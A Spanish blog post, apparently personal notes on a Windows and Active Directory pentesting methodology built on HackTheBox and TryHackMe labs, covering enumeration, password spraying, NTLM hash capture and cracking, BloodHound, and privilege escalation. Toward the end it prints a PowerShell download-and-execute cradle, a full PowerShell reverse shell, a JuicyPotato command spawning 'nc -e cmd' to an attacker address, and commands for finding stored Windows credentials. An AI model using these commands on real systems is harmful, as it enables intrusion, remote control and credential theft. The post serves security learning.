---
layout: post
author: Sergio Salgado
---

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
- <a href="#reconocimiento">Reconocimiento</a>
- <a href="#enumeracion">Enumeracion</a>
- <a href="#explotacion">Explotacion</a>
- <a href="#hardening">Hardening</a>

## [](#header-2)<a id="introduccion">Introduccion</a>
Un analisis de vulnerabilidades exitoso consiste en desarrollar una metodologia util para su ejecucion, en este post el objetivo es plasmar las herramientas vistas en el Libro Hacking Exposed Windows; a su vez actualizare la manera que se puede usar las herramientas desde kali Linux 2022 y tambien poner en que maquinas se ha utilizado en HtB para poder ejemplificar de manera correcta dichas acciones.

## [](#header-2)<a id="reconocimiento">Reconocimiento</a>

La primera herramienta seria ver como responde el DNS del objetivo con la herramienta whois, que viene instalada en Kali predeterminadamente

```s
whois 192.168.30.15
```

Si el objetivo esta expuesto a la red, podemos emplear OSINT con Shodan, Google, etc.

Podemos hacer un banner grabbing con netcan de la manera siguiente:

```s
nc -vv server 80
```

Para obtener el sistema operativo base, bastara con un ping. Los paquetes ttl 64 significa que es linux y 128 significara que nos presentamos ante una Windows

Con nmap podemos tambien descubrir equipos aledanos o puertos expuestos, *hay que tener en cuenta que este escaneo es muy ruidoso y se puede bloquear la conexion* los comandos que suelo utilizar son:

```s
#Para descurbir mas hosts
sudo nmap 10.10.11.170/24

#Escaneo rapido
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.170

#Escaneo rapido con informacion de los puertos
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.170 -oG allPorts

#Escaneo sobre los puertos descubirtos
sudo nmap -sCV -p22,8080 10.10.11.170 -oN targeted

#Escaneo sobre UDP
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.116
```

## [](#header-2)<a id="enumeracion">Enumeracion</a>
Para tener un enfoque mas atinado, necesitamos tener una idea de que servicios son los que se descuidan en su configuracion normalmente. 

Los servicios de Windows tipicamente atacados son:

| #  |        **Name**                            | **PORT** |
|:---|:-------------------------------------------|:---------|
| 1  | DNS zone transfer                          | 53       |
| 2  | Microsoft RPC                              | 135      |
| 3  | NetBIOS Name Service (NBNS)                | 137      |
| 4  | NetBIOS session service (SMB over NetBIOS) | 139      |
| 5  | SMB over TCP (Direct Host)                 | 445      |
| 6  | Simple Network Management Protocol (SNMP)  | 161      |
| 7  |Lightweight Directory Access Protocol (LDAP)| 389      |
| 8  |Global Catalog Service                      | 3268     |
| 9  | Terminal Services                          | 3389     |

NetBIOS enumeration
Para obtener la tabla de nombres de netBIOS de una maquina remota
nbtstat -a <IP add>

Para obtener el contenido de la cache de la tabla de netBIOS y las IP de resolucion, usado en investigaciones forences 
```s
nbtstat -c
```
Para enumerarlo con nmap 
```s
nmap -sV -v --script nbstat.nse <IP add>
```
Otra herramienta con interfaz gráfica para este protocolo es NetBIOS, Usuarios, Domain Names y MAC adrresses es  "NetBIOS Enumerator"

Enumeracion de Usuarios
Existe un repositorio de herramientas remotas y de linea de comandos llamadas PsTools 
- PsExec ejecuta procesos remotamente
- PsGetSid despliega el SID de una computadora o usuario
- PsLoggedOn muestra quien esta loggeado localmente y via recursos compartidos
- PsFile muestra los archivos abiertos remotamente
- PsKill cierra procesos mediante el nombre o ID del proceso
- PsInfo Informacion del sistema
- PsList Lista informacion detallada sobre los procesos
- PsLogList para hacer dump de los logs guardados
- PsPasswd cambia las contraseñas de usuarios
- PsShutdown Apaga y opcionalmente reinicia la computadora

Enumeracion de Recursos Compartidos usando NetView
Para detectar equipos en la red
```s
net view \\<IP add> /ALL
net view /domain:<domain name>
```

Conexion al recurso compartido con usuario null
```s
net use \\<IP add>\ipc$ "" /u:""
```
Enumeracion de SNMP
Incluso snmp v3 cuenta con vulnerabilidades. Como funciona es que el string public tiene permisos de lectura, un string privado tiene permisos de lectura y escritura. Al hacer sniffing de red se podría interceptar esta informacion.
Existe la herramienta snmpwalk
```s
snmpwalk -v1 -c public <IP add>
```
Para la enumeracion con nmap, podemos llegar a encontrar nombres de usuarios, equipos, servicios corriendo.
```s
nmap -sU -p 161 --script=snpm-process <IP add>
```

Enumeracion de LDAP
Softerra LDAP Administrator provee de varias funcionalidades escenciales para el desarrollo LDAP como scripts de python

ldapsearch lo usan los atacantes para enumerar 

Enumeracion de NTP
Si los relojes no estan sincronizados, no se puede iniciar sesion mediante kerberos y puede haber un DOS, los atacantes consultan el servicio para obtener informacion util como hosts conectados, client addresses en la red, sus nombres y OSs, IPs internas si el NTP esta en la DMZ
Las herramientas a usar son:
```s
ntptrace
ntpdc
ntpq
```
Enumeracion de NFS
Se usan las herramientas:
```s
showmount -e <IP add>

rpcinfo -p 10.10.1.19
```
RPCscan se comunica con los servicios de rpc y hace un check de las misconfigurations en los recursos compartidos de NFS
```s
rpc-scan.py <IP add> --rpc
```
SuperEnum incluye un script para hacer la enumeracion basica de cualquier puerto abierto
```s
./superenum Running script
```

Enumeracion de SMTP
SMTP puerto 25 nos provee de 3 comandos
VRFY - Validate users
EXPN - Muestra la direccion actual de entrega de los alias y listas de correos
RCP TO - Define los recipientes del mensaje
Aqui podemos usar telnet para hacer un banner grabbing y extraer informacion de los 3 comandos anteriores
```s
telnet <IP add> 25
```
Nmap tiene muchos scripts para esta enumeracion, en el ejemplo se usa:
```s
nmap -p 25 --script=smtp-enum-users 10.10.1.19
```
metasploit tiene tambien un modulo auxiliar para esto
```s
smtp_enum
```
Enumeracion de DNS y zonas de transferencia
Si el DNS del objetivo permite la zona de transferencia, el atacante puede usar utilizar esta tecnica para obtener los nombres de servidores DNS, nombres de equipos, maquinas, direcciones I, alias, etc. 
Se utilizan herramientas como nslookup, dig, DNSReacon

DNSSEC Zone Walking
Esta tecnica es una enumeracion donde el atacante intenta obtener los records internos del servidor de DNS si el servidor de DNS no está configurado correctamente.
```s
ldns-walk @8.8.8.8 iana.org

./dnsrecon-py -d www.certifiedhacker.com -z
```

Usando nmap
```s
nmap --script=broadcast-dns-service-discovery certifiedhacker.com
nmap -sU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=certifiedhacker.com 162.159.25.175
```
Enumeracion de IPsec
Se puede usar para extraer informacion como algoritmos de encriptacion y hasheo, tipos de autenticacion, algoritmos de distribucion de llaves y SA LifeDuration
```s
nmap -sU -p 500 <IP add>

ike-scan -M <IP add>
```
Enumeracion de VoIP
```s
svmap <IP add>

auxiliary/scanner/sip/enumerator
```

Enumeracion de usuarios de Unix/Linux
```s
rusers Muestra una lista de usuarios que estan loggeados en las maquinas remotas o en las maquinas de la red local
rwho Muestra una lista de usuarios que estan loggeados en los hosts de la red local
finger Muestra informacion sobre los usuarios de sistema, como login name, real name, terminal name, idle time, login time, office location y numeros de telefono de oficina
```

Enumeracion de Telnet y SMB
```s
nmap -p 23 10.10.1.19
```
SMBMap, smbclient enum4linux  nullinux, para hacer un escaneo directo a SMB
```s
nmap -p 445 -A 10.10.1.19

sudo nmap -p 445 --script smb-protocols 10.129.232.227 -oN nmap_smb_protocols.txt
sudo nmap -p 139 --script smb-protocols 10.129.232.227 -oN nmap_smb_protocols.txt

#Buscando Credenciales nulas
smbclient -L 10.129.232.227 -N

#Para ver los permisos de las carpetas compartidas
smbmap -H 10.129.232.227
#Para entrar a una carpeta
smbmap -H 10.129.232.227 -r [Carpeta]
#Para descargarnos un archivo
smbmap -H 10.129.232.227 --download [Carpeta/Archivo]

smbmap -H 10.129.232.227 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
```

Enumeracion de FTP TFTP
las transferencias de la informacion son en texto plano y se pueden interceptar informacion como nombres de usuario y contraseñas.
FTP bounce, FTP brute force y packet snifing
```s
nmap -p 21 www.certifiedhacker.com
```
Para TFTP(Puerto 69) existen herramientas como PortQry y Nmap


### [](#header-3)<a id="user_enum">Username Enumeration</a>

Tenemos la utilidad GetNPUsers
```s
python3 GetNPUsers.py active.htb/ -no-pass -usersfile users.txt
```
Se pueden enumerar usuarios validos mediante kerbebrute, que escencialmente explota como Kerberos responde ante un usuario valido.
```s
kerbrute_linux_386 userenum --dc 10.10.10.192 -d Mailing.local /usr/share/wordlists/SecLists/Usernames/Names/names.txt --safe -v
```

En el comando, Mailing.local es el domain del Active directory y users.txt es la lista de usuarios a probar.


**Nota** El reloj de la maquina debera estar cincronizado, si no esta, existe la utilidad siguiente para sincronizarlo:
```s
ntpdate 10.129.232.227
```

Tenmos tambien la utilidad GetUsersSPNs.py

Otra alternativa más rapida podría ser un modulo de metasploit 
```s
msf5 auxiliary(gather/kerberos_enumusers) >
```
Podriamos recibir resultados identicos pero las opciones más estables son kerbrute o Impacket <a href="http://getnpusers.py/"> GetNPUsers.py.</a>

Una vez tengamos un usuario y contrasena, GetNPUsers nos puede ayudar para solicitar un ticket de kerberos en caso de que este activo.

### [](#header-3)<a id="netbios_enum">Enumeracion de NETBIOS</a>
El primer paso, sera descubrir si existe un dominio presente, este escaneo es pasivo y el comando a ejecutar desde una maquina windows seria:

```s
C:\>net view /domain
```
## [](#header-2)<a id="reconocimiento">Initial Access</a>
Fuerza bruta de contrasenas SMB y SHH
```s
#en mi maquina parrot tengo esta utilidad como cme
#Con lista de usuarios y contrasenas
crackmapexec smb 10.10.10.184 -u users -p credentials --continue-on-success
crackmapexec ssh 10.10.11.166 -u users -p password --continue-on-success

#validacion
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'

#Listar los recursos compartidos con el nuevo usuario
cme smb 10.129.232.227 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

## [](#header-2)<a id="Breaching_ad">Breaching Active Directory</a>
NTLM Authenticated Services
New Technology LAN Manager (NTLM). Es el modo de autenticacion usado por varias tecnologias integradas en el AD, como Mail (Outlook Web App), accesos a RDP expuestos a internet, VPN que son integradas con AD, aplicaciones web que hacen uso de NetNTLM.
+(SOC protip) Este tipo de ataques se pueden detectar via multiples inicios de sesion fallidos que contienen el codigo 4265
Juega el rol de hombre en medio entre el cliente y el AD, Resolviendo un reto que solamente con la contraseña correcta se resolverá
-TEST
Brute-force Login Attacks
Password Spraying

LDAP Bind Credentials
Otro metodo de autenticación del AD es la autenticacion Lightweight Directory Access Protocol (LDAP). Es similar a la autenticación NTLM. Solamente que con este metodo, las credenciales de usuario se verifican directamente. La aplicacion usa primero un par de contraseñas que tiene para LDAP y despues verificar el usuario de AD.
Su uso es popular en aplicaciones como: Gitlab, Jenkins, Custom-developed web applications, Printers, VPNs.
Es posible usar los mismos ataques que se usaron en NTLM. Si se obtiene acceso a un servidor de Gitlab por ejemplo, podría ser posible obtener las credenciales de AD, ya que normalmente se almacenan en texto plano.
-TEST
LDAP Pass-back Attacks
Cuando se obtiene acceso a la red local o a la aplicacion web. Redirigiendo la autenticacion a nuestro dispositivo maligno podremos interceptar estas credenciales de LDAP.
Para realizar este ataque, usaremos 
```s
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

La configuracion de nuestro servidor LDAP tendrá vulnerabilidades para obligar a que se compartan las claves en texto plano.

```s         
#Nombre del archivo: olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

    olcSaslSecProps: Specifies the SASL security properties
    noanonymous: Disables mechanisms that support anonymous login
    minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.
```

Para inciarlo  ejecutamos el comando
```s
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Para probar su funcionamiento:
```s
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

Una vez configurado correctamente, podemos obtener las credenciales con un
```s
sudo tcpdump -SX -i breachad tcp port 389
```

Authentication Relays
Continuando con los metodos de autenticación, existen numerosos servicios que hablan entre si para permitir a los usuarios el uso de los mismos. En esta ocacion veremos el servicio de SMB (Server Message Block) el cual permite a los clientes como workstations comunicarse con el servidor.
-TEST
Intercepting NetNTLM Challenge
En esta parte usaremos un programa que se llama responder, el cual interceptará el reto NetNTLM para crackearlo, ya que usualmente hay demasiados packetes de estos sobre la red. En un entorno normal, responder puede envenenar cualquier peticion de Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS) o Web Proxy Auto-Discovery (WPAD). Responder se encuentra en el  <a href=" https://github.com/lgandx/Responder">link</a>.
Su forma de uso será:
```s
sudo responder -I tun0
```

Una vez obtenido el archivo NTLMv2-SSP Hash, podemos crackear las contraseñas con
```s
hashcat -m 5600 <hash file> <password file> --force
```

Relaying the Challenge (Reenvio del reto)
Para poder reenviar este ataque, se tienen que cumplir varias condiciones que se obtienen con la enumeración de los activos:
1. El firmado por SMB debera estar deshabilitado o habilitado, pero no reforzado. 
2. La cuenta asociada deberá contar con los permisos necesarios para acceder a los recursos solicitados.

Microsoft Deployment Toolkit
En las organizaciones no se debería tener a los empleados de TI portar USBs y DVDs para instalar programas, para eso usarían herramientas como el Developer Kit y es aquí donde explotaremos las vulnerabilidades que este tipo de soluciones contienen. 
Microsoft Deployment Toolkit (MDT) nos ayudará a mantener las imagenes del OS en una ubicacion centralizada y actualizada; normalmente esta herramienta está integrada con Microsoft Deployment Toolkit (MDT), quien gestiona las actualizaciones de Microsoft.
En este ejemplo se tomará en cuenta Preboot Execution Environment (PXE) boot.
El archivo normalmente se encuentra en la carpeta TMP. Y podemos acceder a el con la <a href="https://github.com/wavestone-cdt/powerpxe">herramienta</a> , o con powershell:
```s
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.   

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

Nuestro objetivo será encontrar un archivo llamado bootstrap.ini y ahi estarán las credenciales de acceso a AD.
Para mas informacion sobre este ataque, visitemos el link <a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps">herramienta</a> 

Configuration Files
La última enumeracion posible que exploraremos son los archivos de configuración. En dado caso de que podamos acceder a una maquina, podremos recuperar las credenciales de AD, dependiendo del proposito del host, podremos encontrar estas en diferentes lugares como: Archivos de configuracion de Aplicaciones Web,  Archivos de configuracion de servicios, Llaves de registro, Apliaciones desplegadas centralmente. Existen herramientas para enumerar este ataque como <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> 


## [](#header-2)<a id="Enumerating_ad">Enumerating Active Directory</a>
Hacking
El objetivo principal va a ser obtener la SAM, que es el equivalente al archivo /etc/shadow de Linux, el cual se encuentra en la ruta C:\windows\system32\config\SAM
La estructura del archivo de la SAM es Username:User ID:LM Hash:NTLM Hash  ejemplo:

Guest:501:NO PASSWORD*************:NO PASSWORD*************:::
Shiela:1005:NO PASSWORD*************:0CB6948805F797BF2A82807973B89537
En esta parte se explicará la herramienta binaria llamada runas.exe.
Si alguna vez haz tenido credenciales de AD, pero no haz podido logearte con ellas, esta es la solucion. Si tenemos las credenciales de AD en el formato :, podremos usar Runas, un comando comun de runas.exe luce como:
```s
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

Let's look at the parameters:

    /netonly - Since we are not domain-joined, we want to load the credentials for network authentication but not authenticate against a domain controller. So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here.
    /user - Here, we provide the details of the domain and the username. It is always a safe bet to use the Fully Qualified Domain Name (FQDN) instead of just the NetBIOS name of the domain since this will help with resolution.
    cmd.exe - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since you can then use that to launch whatever you want, with the credentials injected.

Una vez dentro del sistema, podemos listar los Volumenes, uno de los mas comunes en listar es el SYSVOL, el cual almacena las GPOs e informacion relacionada con el dominio.
*Antes de empezar a listar el SYSVOL*, es necesario configurar el DNS, con lo siguiente:
```s
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

ADVMonitoreoIP vs Hostnames
Existe una pequeña diferencia entre los comandos 
```s
dir \\za.tryhackme.com\SYSVOL 
dir \\<DC IP>\SYSVOL
```
Mientras que con el primer ejemplo podemos forazar a que se realice una autenticación mediante kerberos, con el segundo podemos forzar una autenticación NTLM.

Enumeracion via consola de administracion de Windows.
Es posible enumerar el contenido del directorio activo mientras un equipo está unido al dominio. Para hacerlo, se listan los pasos a seguir.
1.1 Instalar los Snaps-in de Directorio Activo
    Press Start
    Search "Apps & Features" and press enter
    Click Manage Optional Features
    Click Add a feature
    Search for "RSAT"
    Select "RSAT: Active Directory Domain Services and Lightweight Directory Tools" and click Install

1.2 Iniciamos MMC con Windows+x y colocamos MMC (Si  no estamos unidos al dominio no podremos continuar. Necesitamos lo anterior para poder inyectar las credenciales al menos)
1.3 En el MMC podremos ahora enlazar el RSAT Snap-in con los pasos siguientes:
Click File -> Add/Remove Snap-in
Select and Add all three Active Directory Snap-ins
Click through any errors and warnings
Right-click on Active Directory Domains and Trusts and select Change Forest
Enter za.tryhackme.com as the Root domain and Click OK
Right-click on Active Directory Sites and Services and select Change Forest
Enter za.tryhackme.com as the Root domain and Click OK
Right-click on Active Directory Users and Computers and select Change Domain
Enter za.tryhackme.com as the Domain and Click OK
Right-click on Active Directory Users and Computers in the left-hand pane
Click on View -> Advanced Features

1.4 Si todo marcha bien, podremos empezar a enumerar usuarios, maquinas en el directorio activo.

Enumeración vía Command Prompt
Algunas vecxes es necesario la enumeracion por comandos, si es que se entra a un sistema por medio de algun troyano. Es suficiente el cmd para listar información util.
La primera herramienta que podemos usar es "net", la cual nos permite enumerar informacion util local y del AD.
Usuarios
Para traernos los usuarios en el dominio y dimensionar el tamaño del AD.
```s
net user /domain
```
Para traer la información sobre solo un usuario
```s
net user zoe.marshall /domain
```
Informacion de grupos
```s
net group /domain
net group "Tier 1 Admins" /domain
```
Informacion de politica de contraseñas
```s
net accounts /domain
```

Para más usos del comando net, esta el sitio https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems

Enumeración vía PowerShell
Enumeracion de usuarios
```powershell
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
```
Podemos mejorar la salida de esta consulta agregando
```powershell
| Format-Table Name,SamAccountName -A
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com  | Format-Table Name,SamAccountName -A
```

Enumeración de Grupos
```powershell
Get-ADGroup -Identity Administrators -Server za.tryhackme.com 
```
Podemos tambien listar quienes pertenecen al grupo con:
```powershell
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com 
```
Objetos de directorio Activo
Objetos cambiados del directorio activo en una fecha especifica
```powershell
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
```
Si queremos hacer un ataque de contraseñas sin bloquear a los usuarios, podemos el siguiente comando:
```powershell
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```
Informacion del Dominio
```powershell
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```
Alterar Objetos de AD
Esta parte se cubre en Explotacion de AD, pero un ejemplo de cambio de contraseña para los usuarios es:
```powershell
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
```
Enumeración vía BloodHound
BloodHound es la herramienta desarrollada por el mismo Microsoft, diseñada para averiguar las brechas o nodos para poder llegar a ser Administradores en un Dominio.
El colector de la informción se llama Sharphound y sus variantes son
Sharphound.ps1 que es el ejecutable de PowerShell, Sharphound.exe que es el ejecutable de Windows, AzureHound.ps1 es el ejecutable para powershell del entorno de Azure y obtener la identidad de Azure o el Acceso a la Administración de este.

*Nota, las versiones de BloodHound y SharpHound deberán coincidir para tener resultados eficientes.

Ejecutaremos Sharphound con el comando siguiente:
```powershell
Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs
```
Parameters explained:

    CollectionMethods - Determines what kind of data Sharphound would collect. The most common options are Default or All. Also, since Sharphound caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
    Domain - Here, we specify the domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.
    ExcludeDCs -This will instruct Sharphound not to touch domain controllers, which reduces the likelihood that the Sharphound run will raise an alert.

Los parámetros de Sharphound se encuentran en https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html

Descarga de archivos con powershell

```powershell
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2:9001/shell.ps1')
```

.bat Para ejecutar el comando anterior
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
## [](#header-2)<a id="Privilege_escalation">Privilege escalation</a>
Manualmente, tenemos el comando whoami, pero en esta ocacion con los privilegios posibles:
```s
whoami /priv
```
En este ejemplo 1 tenemos como respuesta el privilegio de SeImpersonatePrivilege, el cual se explota de la forma:

```s
#Descargamos Juicy Potato de github, esta herramienta nos va a permitir inyectar comandos privilegiados
git clone https://github.com/ohpe/juicy-potato.git
#Descargamos el netcan de x64 o x86 
#Abrimos un servidor de python para traernos los archivos
python3 -m http.server 8080

#Nos descargamos los archivos en la victima con
certutil.exe -f -urlcache -split http://10.10.14.29:8080/[Archivos]

#Usamos JuicyPotato con -l {Puerto que sea}, y en este caso abriremos un cmd privilegiado, -a pasandole los argumentos de 
.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.29 4646"

#Nos ponemos en escucha desde la maquina atacante
nc -nlvp 4646
```

Podemos usar una tool que nos sugiere como explotar un cve para la escalada d elos privilegios
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

#Primero instalamos las dependencias
python -m pip install xlrd
#Actualizamos la base de datos con 
windows-exploit-suggester.py --update

Si tenemos contrasenas y usuarios validos, podemos intentar una conexion con rpcclient
```s
rpcclient 10.129.232.227 -U 'SVC_TGS%GPPstillStandingStrong2k18'
rpcclient 10.129.232.227 -U 'SVC_TGS%GPPstillStandingStrong2k18' -c 'enumdomusers'

enumdomgroups
querygroupmem [rid]
queryuser [rid]
querydispinfo
```

## [](#header-2)<a id="Post_priv_escalation">Post priv escalation</a>


Las credential filenames tienen una cadena de 32 caracteres como por ejemplo: "85E671988F9A2D1981A4B6791F9A4EE8" y las masterkeys son un GUID como "cc6eb538-28f1-4ab4-adf2-f5594e88f0b2", para encontrarlas tenemos el comando:
```shell
cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\security\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Local\Microsoft\Protect  & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Protect"
```
Las credenciales y masterkey estan en base64, podemos regresarlas a su orden normal con mimikats https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
